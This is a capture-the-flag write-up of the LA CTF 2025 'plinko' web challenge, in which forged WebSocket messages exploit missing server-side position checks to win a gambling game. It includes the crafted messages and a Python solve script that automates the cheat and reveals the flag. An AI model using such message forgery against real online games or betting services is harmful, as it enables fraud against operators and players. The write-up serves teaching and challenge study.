# plinko

<details><summary><strong>Table of Contents</strong></summary>

- [Overview](#overview)
- [Background](#background)
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Conclusion](#conclusion)

</details>

## Overview

- Contributor: @siunam, @ensy.zip, @ozetta, @YMD, @vow
- 98 solves / 336 points
- Author: @chinmay
- Overall difficulty for me (From 1-10 stars): ★★★★☆☆☆☆☆☆

## Background

I was tired of the rigged gambling games online, so I made this completely fair version of plinko. Don't try and cheat me.

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2025/images/Pasted%20image%2020250211123812.png)

## Enumeration

Index page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2025/images/Pasted%20image%2020250211123941.png)

When we go to `/`, it redirects us to `/login`, which means we need to be authenticated first. Let's create an account!

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2025/images/Pasted%20image%2020250211124036.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2025/images/Pasted%20image%2020250211124047.png)

After that, we're redirected to the index page. In here, we can click button "Drop a ball ($100)" to play a game. When we get $10,000, we can get a prize:

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2025/images/Pasted%20image%2020250211124218.png)

As the challenge name suggested, this game is called "Plinko", which is a popular casino game.

Hmm... Since this is a web game, it's common that the client and server communication happened through [WebSocket](https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API). If we look at our Burp Suite WebSockets history, we can see some messages between our client and the server when we click the "Drop a ball" button:

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2025/images/Pasted%20image%2020250211124733.png)

When we click the button, our client will first send the following `msgType` with `join` message:

```json
{
    "msgType": "join",
    "ballPos": {
        "x": 500,
        "y": 10
    },
    "ballVelo": {
        "x": 0,
        "y": 0
    },
    "time": 0
}
```

After that, the server sends this message to us and starts the game:

```json
{"message":"Welcome to the Plinko game!"}
```

During the game, if we collided with one of many pins (Small blue circles) in the game, our client sends the following `msgType` with `collision` message:

```json
{
    "msgType": "collision",
    "velocity": {
        "x": 0,
        "y": 5.277777777777792
    },
    "position": {
        "x": 500,
        "y": 62.77777777777793
    },
    "obsPosition": {
        "x": 500,
        "y": 75
    },
    "time": 316.6666666666667
}
```

Then the server sends back to us with this message:

```json
{
    "y": -3.149669176275241,
    "x": -0.3276611936123577
}
```

Finally, if our ball collided with an obstacle at x-axis 500 and y-axis 1000 like the following, the server will end the game and send a floating point number like `0.15`:

```json
{
    "msgType": "collision",
    "velocity": {
        "x": -2.651243101596606,
        "y": 13.05817199792802
    },
    "position": {
        "x": 532.6445826705122,
        "y": 969.7593307167399
    },
    "obsPosition": {
        "x": 500,
        "y": 1000
    },
    "time": 3983.3333333333194
}
```

Hmm... So it seems like the server controls the game state, not just purely on the client-side. To have a better understanding of the game server, we can take a closer look into the server's source code.

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2025/web/plinko/plinko.zip):**
```shell
┌[siunam♥Mercury]-(~/ctf/LA-CTF-2025/web/plinko)-[2025.02.11|13:01:34(HKT)]
└> file plinko.zip 
plinko.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
┌[siunam♥Mercury]-(~/ctf/LA-CTF-2025/web/plinko)-[2025.02.11|13:01:37(HKT)]
└> unzip plinko.zip        
Archive:  plinko.zip
  inflating: plinko/Dockerfile       
   creating: plinko/public/
  inflating: plinko/public/physics.js  
  inflating: plinko/public/login.html  
  inflating: plinko/public/signup.html  
  inflating: plinko/public/index.html  
  inflating: plinko/package-lock.json  
  inflating: plinko/package.json     
  inflating: plinko/app.js           
```

After reading the source code a little bit, we know that this web application is written in JavaScript with [Express.JS](https://expressjs.com/) framework, and the main logic of the game is in `plinko/app.js`. Let's dig deeper into that JavaScript file!

First off, how can we get the flag?

When the server received a WebSocket message (which triggers the `message` event), it'll check the obstacle (`pinPos`, from JSON attribute `obsPosition`) is at x-axis 500 and y-axis 1000. If it is at that position, the server will determine that the player hit the ground:

```javascript
const WebSocket = require('ws');
[...]
const flag = process.env.FLAG || 'lactf{test_flag}';
[...]
const wss = new WebSocket.Server({ noServer: true });
[...]
wss.on('connection', (ws, req) => {
  try {
    [...]
    ws.on('message', (message) => {
        [...]
        if (pinPos.x==500 && pinPos.y==1000) {
            // ground
            [...]
        }
        [...]
    });
  } catch (error) {
    [...]
  }
});
```

Which means the server will add points to our user. **If our points are greater than 10,000**, the server will send our points and the flag to us:

```javascript
[...]
// landing zone money multipliers
const multipliers = [
    10.0, 6.24, 3.66, 1.98, 0.95, 0.39, 0.12, 0.02, 0.0015, 0.0, 
    0.0015, 0.02, 0.12, 0.39, 0.95, 1.98, 3.66, 6.24, 10.0
  ];
[...]
wss.on('connection', (ws, req) => {
  try {
    [...]
    ws.on('message', (message) => {
        [...]
        if (pinPos.x==500 && pinPos.y==1000) {
            // ground
            let index = Math.floor(ballPos.x/(1000/19));
            if (index<0) index=0;
            if (index>=multipliers.length) index = multipliers.length-1;
            let points = multipliers[index]*100;
            users[req.session['user']].points +=points;
            if (users[req.session['user']].points>10000) socketSend(ws, points+flag, () => ws.close());
            else socketSend(ws, points, () => ws.close());
        }
        [...]
    });
  } catch (error) {
    [...]
  }
});
```

The points are calculated based on which landing zone we are in. If the land on the leftmost or rightmost zone, we'll get 1000 points (10.0 * 100).

With that said, our goal should be **landing on the leftmost or rightmost zone** to gain the maximum points multiplier.

How? Well, cheats!

Now, let's try to send the following WebSocket message, which sends `msgType` with `join`, and sets our ball position to x-axis 500 and y-axis 1000 to hit the leftmost landing zone:

```json
{
    "msgType": "join",
    "ballPos": {
        "x": 0,
        "y": 1000
    },
    "ballVelo": {
        "x": 0,
        "y": 0
    },
    "time": 0
}
```

However, when we send that message, we'll receive this message from the server:

```json
{"error":"Stop cheating"}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2025/images/Pasted%20image%2020250211132656.png)

Well, of course it's not that easy.

If we look at `msgType` with `join`, we can see that the server checks our ball position (`ballPos`):

```javascript
wss.on('connection', (ws, req) => {
  try {
    [...]
    ws.on('message', (message) => {
        let msgData;
       
        try {
            msgData = JSON.parse(message);
        }
        catch(e) {
            return;
        }
        const msgType = msgData.msgType;

        // user dropped a ball
        if (msgType=='join') {
            if (msgData.ballPos.x!=500) {
                socketSend(ws, JSON.stringify({error: "Stop cheating"}), () => ws.close());
                
            }
            [...]
        }
        [...]
    });
  } catch (error) {
    [...]
  }
});
```

As we can see, if our ball's x-axis is not at `500`, the server sends WebSocket message `{"error":"Stop cheating"}` to us and closes our WebSocket connection.

If our ball's x-axis is at `500`, the server sets variable `prevCollision`, `prevVelo`, and `prevTime` with our ball position (`ballPos`), ball velocity (`ballVelo`), and timestamp (`time`):

```javascript
wss.on('connection', (ws, req) => {
  try {
    let prevCollision;
    let prevVelo;
    let prevTime;
    
    ws.on('message', (message) => {
        [...]
        // user dropped a ball
        if (msgType=='join') {
            [...]
            prevCollision = msgData.ballPos;
            prevVelo = msgData.ballVelo;
            prevTime = msgData.time;
            [...]
        }
        [...]
    });
  } catch (error) {
    [...]
  }
});
```

After that, it checks if we are authenticated and have enough money to play:

```javascript
wss.on('connection', (ws, req) => {
  try {
    [...]
    ws.on('message', (message) => {
        [...]
        // user dropped a ball
        if (msgType=='join') {
            [...]
            if (!req.session.user || !req.session['user'] || !(users[req.session['user']])) {
                socketSend(ws, JSON.stringify({error: "Not logged in"}), () => ws.close());
            }
            else  {
                if (users[req.session['user']].points<100) {
                    socketSend(ws, JSON.stringify({error: "Not enough money"}), () => ws.close());
                }
                socketSend(ws, JSON.stringify({ message: 'Welcome to the Plinko game!' }));
                users[req.session['user']].points-=100;
            }
            return;
        }
        [...]
    });
  } catch (error) {
    [...]
  }
});
```

If all validations are passed, the server sends WebSocket message `{"message":"Welcome to the Plinko game!"}` to us and decrease our points 100.

> Note: This `msgType` has a race condition (TOCTOU) in validating our `points`. If we win the race condition, our points can be a negative number. However, in this case, this race condition is not useful to us.

Okay... Now, what if we set our initial ball position to x-axis 500 and y-axis 1000, then "teleport" our ball to x-axis 0 in the `msgType` with `collision`?

Let's try to send the following messages to the server!

```json
{
    "msgType": "join",
    "ballPos": {
        "x": 500,
        "y": 1000
    },
    "ballVelo": {
        "x": 0,
        "y": 0
    },
    "time": 0
}
```

```json
{
    "msgType": "collision",
    "velocity": {
        "x": 0,
        "y": 5.277777777777792
    },
    "position": {
        "x": 500,
        "y": 1000
    },
    "obsPosition": {
        "x": 500,
        "y": 1000
    },
    "time": 316.6666666666667
}
```

Although the first message passed the validations, the second one, did not:

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2025/images/Pasted%20image%2020250211134544.png)

Again, same as `msgType` with `join`, the server validates our message. This time, however, the validations are much more complex, such as calculating the ball's physic using library [matter-js](https://www.npmjs.com/package/matter-js). Here is the high-level summary:
1. Function `validatePosition` verifies our ball's trajectory is whether valid or not based on our previous and current ball's position, velocity, and game engine timestamp
2. Function `hittingWall` verifies if our ball is hitting/near an obstacle or not based on the ball and the obstacle position
3. The last if statement checks if our ball is really hitting an obstacle based on our ball position and the hard-coded pin positions (`pinPositions`)

<details><summary><strong>Validations Implementation</strong></summary>

```javascript
const Matter = require('matter-js');
[...]
// the set positions of all pins
const pinPositions = [];
for (let row=5; row<16; row++) {
    const middleSpace = 65*(row-1);
    const frontPad = (1000-middleSpace)/2
    for (let pin=0; pin<row; pin++) {
        pinPositions.push({'x': pin*65+frontPad, 'y': (row-4)*85-10});
    }
}
pinPositions.push({'x': 190, 'y': 480});
pinPositions.push({'x': 810, 'y': 480});
pinPositions.push({'x': 500, 'y': 1000});
[...]
wss.on('connection', (ws, req) => {
  try {
    [...]
    ws.on('message', (message) => {
        [...]
        const ballPos = msgData.position;
        const pinPos = msgData.obsPosition;
        const initialV = msgData.velocity;
        const time = msgData.time;
        [...]
        // validating your given trajectory
        let result = validatePosition(prevCollision, prevVelo, prevTime, ballPos, initialV, time);

        // checking that you're actually hitting an obstacle
        if (Matter.Vector.magnitude(Matter.Vector.sub(ballPos, pinPos))>15) {
            // check if it's hitting a wall or the ground
            let hitting = hittingWall(ballPos);
            if (hitting==false && pinPos.y!=1000) result = false;

        }
        // check that there's really an obstacle in the place you said
        if (!pinPositions.find(position => position.x===pinPos.x && position.y===pinPos.y)) result = false;

        // you cheated
        if (!result) {
            socketSend(ws, JSON.stringify({"error": "Stop cheating!!"}), () => ws.close());
            return;
        }
        [...]
    });
  } catch (error) {
    [...]
  }
});
```

</details>

I looked at those validation functions in more details. However, they are way too complex. Let's try to find a way to bypass them without diving into those complex logic.

Now, assume we cannot bypass the validation and have to play the game normally, can we just **replay the entire gameplay**??

If we jot down all WebSocket messages from a game that landed on the slightly left or right landing zone, then send those WebSocket messages again, will we still pass all the validation?

After many attempts, I got a gameplay that landed on x-axis 63. By using the following code in our browser console, we can replay that game:

<details><summary><strong>Replay Gameplay Code</strong></summary>

```javascript
function sendWebsocketMessages(uri, messages) {
    const ws = new WebSocket(uri);

    ws.onopen = function () {
        messages.forEach(message => {
            ws.send(message);
        });
    };

    ws.onmessage = function (event) {
        console.log('Message from server: ', event.data);
    };

    ws.onclose = function (event) {
        if (event.wasClean) {
            console.log('Connection closed cleanly');
        } else {
            console.error('Connection interrupted');
        }
    };

    ws.onerror = function (error) {
        console.error('WebSocket error: ', error);
    };
}

const websocketUri = 'wss://plinko.chall.lac.tf/';
const messages = [
    '{"msgType":"join","ballPos":{"x":500,"y":10.833333333333336},"ballVelo":{"x":0,"y":0.5555555555555571},"time":33.333333333333336}',
    '{"msgType":"collision","velocity":{"x":0,"y":5.277777777777792},"position":{"x":500,"y":62.77777777777793},"obsPosition":{"x":500,"y":75},"time":316.6666666666667}',
    '{"msgType":"collision","velocity":{"x":0.07816515757997422,"y":2.9454092954123885},"position":{"x":501.71963346675943,"y":63.410115610183645},"obsPosition":{"x":500,"y":75},"time":683.3333333333331}',
    '{"msgType":"collision","velocity":{"x":0.6665674604777792,"y":1.4181660856974496},"position":{"x":509.051875532015,"y":63.73216477507778},"obsPosition":{"x":500,"y":75},"time":866.6666666666661}',
    '{"msgType":"collision","velocity":{"x":0.8978774958538907,"y":6.667812899679126},"position":{"x":529.7030579366549,"y":146.81408368992106},"obsPosition":{"x":532.5,"y":160},"time":1250}',
    '{"msgType":"collision","velocity":{"x":-1.41519468869285,"y":10.386064515730205},"position":{"x":457.52812881331954,"y":322.33670732550127},"obsPosition":{"x":467.5,"y":330},"time":2100.000000000003}',
    '{"msgType":"collision","velocity":{"x":-5.657040153875414,"y":7.192574183902486},"position":{"x":367.0154863513129,"y":404.08456093460836},"obsPosition":{"x":370,"y":415},"time":2366.6666666666674}',
    '{"msgType":"collision","velocity":{"x":-5.174636614482154,"y":1.2203941136871272},"position":{"x":310.0944835920092,"y":402.23111840738926},"obsPosition":{"x":305,"y":415},"time":2549.999999999999}',
    '{"msgType":"collision","velocity":{"x":-1.7647842037068813,"y":10.120452424565606},"position":{"x":228.9144102214927,"y":580.2719299373971},"obsPosition":{"x":240,"y":585},"time":3316.666666666659}',
    '{"msgType":"collision","velocity":{"x":-4.251652862936112,"y":15.296195121018691},"position":{"x":63.099948566984324,"y":970.9902063237572},"obsPosition":{"x":500,"y":1000},"time":3966.666666666653}'
];

sendWebsocketMessages(websocketUri, messages);
```

</details>

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2025/images/Pasted%20image%2020250211141522.png)

Wait, why? The first and the second message passed the validations. However, **from the third message and onwards**, it didn't pass.

After some painful debugging, we can see the following code after passing the validations:

```javascript
wss.on('connection', (ws, req) => {
  try {
    [...]
    ws.on('message', (message) => {
        [...]
        let normal;
        if (pinPos.x==190 && pinPos.y==480) {
            // left wall
            normal = Matter.Vector.create(1, -0.38142587779);
        }
        else if (pinPos.x==810 && pinPos.y==480) {
            // right wall
            normal = Matter.Vector.create(1, 0.38142587779);
        }
        else {
            normal = Matter.Vector.sub(ballPos, pinPos);
        }
        normal = Matter.Vector.normalise(normal);

        // Compute the normal component of velocity
        let dotProduct = Matter.Vector.dot(initialV, normal);
        let vNormal = Matter.Vector.mult(normal, dotProduct);

        let vTangent = Matter.Vector.sub(initialV, vNormal);

        let vNormalReflected = Matter.Vector.neg(vNormal);
        let resultantVelocity = Matter.Vector.mult(Matter.Vector.add(vTangent, vNormalReflected), 0.6);
        resultantVelocity = Matter.Vector.rotate(resultantVelocity, Math.random()*0.32-0.16);

        prevCollision = ballPos;
        prevVelo = resultantVelocity;
        prevTime = time;
        // send the resultant velocity of the collision
        socketSend(ws, JSON.stringify(resultantVelocity))
    });
  } catch (error) {
    [...]
  }
});
```

Which is to send a WebSocket message to the client, and it contains the x and y-axis of the rotating velocity. Basically telling how our ball should bounce when we hit an obstacle.

Upon a closer look, we can see that the velocity is actually random:

```javascript
resultantVelocity = Matter.Vector.rotate(resultantVelocity, Math.random()*0.32-0.16);
```

Which means we couldn't simply replay the game and win it.

> Note: JavaScript `Math.random()` is not a CSRNG (Cryptographically Secure Pseudorandom Number Generator) and it can be predicted. However, in practice, we couldn't predict the RNG sequence as we can only get 1 sample. To predict the sequence, we need minimum 5 samples.

Ahh... Is there any more ways to cheat in this game?... Well, yes.

In function `validatePosition`, as I mentioned earlier, it checks our previous and current position, velocity, and engine timestamp. What's interesting is **the `0.001` limit**. Moreover, **it doesn't check our current ball x-axis position**:

```javascript
// validation function; checks that the trajectory the user passed in matches with the velocity vector from the previous collision
function validatePosition(prevCollision, prevVelo, prevTime, currCollision, currVelo, currTime) {
    [...]
    if (Math.abs(prevVelo.x-currVelo.x)>0.001) {
        return false;
    }
    const t = (currTime-prevTime);
    const posChange = calcPositionDiff(t, prevVelo.y);
    const veloChange = timeInterval*t/1000;

    const newYVelo = veloChange+prevVelo.y;
    const newYPos = posChange+prevCollision.y;

    if (Math.abs(newYVelo-currVelo.y)>0.001) {

        return false;
    }
    if (Math.abs(newYPos-currCollision.y)>0.001) {
        return false;
    }
    return true;
}
```

This function basically means if **our current and the future velocity and position is within the `0.001` limit**, this validation will be passed.

Since the server doesn't check our initial ball y-axis position, we can first set our initial ball position to x-axis 500, y-axis 1000, ball velocity to 0 in both axes, and engine timestamp (`time`) to 0.

Then, in the `collision` message type, we need to:
- Set (Teleport) our **ball position to x-axis 0 and y-axis 1000**. This is because function `validatePosition` doesn't check our current ball x-axis position.
- Set our **ball velocity to 0 in both axes**. If the initial ball velocity and the collision ball velocity is 0, it'll always stay within the `0.001` limit.
- Set **engine timestamp (`time`) to 0**. Because `0` multiply anything is `0`, which means the future y-axis velocity (`newYVelo`) will be `0`. And if both `newYVelo` and current y-axis velocity (`currVelo.y`) is 0, the subtraction will result in `0` (0 - 0 = 0), which is within the `0.001` limit.
- Set the **obstacle position (`obsPosition`) to x-axis 500 and y-axis 1000** to touch the landing zone.

## Exploitation

Armed with above information, we can cheat in this game and get $10,000 for the flag!

To do so, we need to send the following WebSocket messages 11 times to get $10,000:

Initial ball message:

```json
{
    "msgType": "join",
    "ballPos": {
        "x": 500,
        "y": 1000
    },
    "ballVelo": {
        "x": 0,
        "y": 0
    },
    "time": 0
}
```

Collision message:

```json
{
    "msgType": "collision",
    "velocity": {
        "x": 0,
        "y": 0
    },
    "position": {
        "x": 0,
        "y": 1000
    },
    "obsPosition": {
        "x": 500,
        "y": 1000
    },
    "time": 0
}
```

To automate the above steps, I've written the following Python solve script:

<details><summary><strong>solve.py</strong></summary>

```python
import requests
import string
import random
import websocket
import json

class Solver:
    def __init__(self, baseUrl):
        self.baseUrl = baseUrl
        self.websocketUrl = f'ws://{baseUrl.split("http://")[1]}/' if baseUrl.startswith('http://') else f'wss://{baseUrl.split("https://")[1]}/'
        self.session = requests.session()
        self.currentPoints = 1000
        self.REGISTER_ENDPOINT = '/signup'
        self.RANDOM_USERNAME_AND_PASSWORD = ''.join(random.choice(string.ascii_letters) for i in range(10))
        self.INITIAL_BALL_MESSAGE = '{"msgType":"join","ballPos":{"x":500,"y":1000},"ballVelo":{"x":0,"y":0},"time":0}'
        self.COLLISION_MESSAGE = '{"msgType":"collision","velocity":{"x":0,"y":0},"position":{"x":0,"y":1000},"obsPosition":{"x":500,"y":1000},"time":0}'
        self.WEBSOCKET_MESSAGES = [self.INITIAL_BALL_MESSAGE, self.COLLISION_MESSAGE]
        self.ATTEMPTS_TO_WIN = 11

    def register(self):
        print(f'[*] Registering a new account. Username and password: {self.RANDOM_USERNAME_AND_PASSWORD}')
        data = {
            'username': self.RANDOM_USERNAME_AND_PASSWORD,
            'password': self.RANDOM_USERNAME_AND_PASSWORD
        }
        response = self.session.post(f'{self.baseUrl}{self.REGISTER_ENDPOINT}', json=data)
        if response.status_code != 200:
            print('[-] Unable to register a new account')
            exit(0)

    def sendWebsocketMessage(self):
        sessionCookie = self.session.cookies.get('connect.sid')
        ws = websocket.create_connection(self.websocketUrl, header=[f'Cookie: connect.sid={sessionCookie}'])

        for message in self.WEBSOCKET_MESSAGES:
            print(f'[*] Current points: {self.currentPoints:<5}', end='\r')

            ws.send(message)
            result = ws.recv()
            try:
                if message == self.WEBSOCKET_MESSAGES[0]:
                    self.currentPoints -= 100

                newPoints = int(result)
                self.currentPoints += newPoints
            except ValueError:
                pass

            try:
                message = json.loads(result)
            except json.decoder.JSONDecodeError as error:
                flag = result.replace('1000', '')
                print(f'\n[+] Flag: {flag}')

        ws.close()

    def solve(self):
        self.register()
        for _ in range(self.ATTEMPTS_TO_WIN):
            self.sendWebsocketMessage()

if __name__ == '__main__':
    baseUrl = 'https://plinko.chall.lac.tf'
    solver = Solver(baseUrl)

    solver.solve()
```

</details>

```shell
┌[siunam♥Mercury]-(~/ctf/LA-CTF-2025/web/plinko)-[2025.02.11|15:38:34(HKT)]
└> python3 solve.py
[*] Registering a new account. Username and password: OmYvJiKMvr
[*] Current points: 9900 
[+] Flag: lactf{mY_b4Ll_w3Nt_P1iNk_pL0Nk_4nD_n0W_1m_br0K3}
```

- **Flag: `lactf{mY_b4Ll_w3Nt_P1iNk_pL0Nk_4nD_n0W_1m_br0K3}`**

## Conclusion

What we've learned:

1. Web game hacking and manipulating WebSocket messages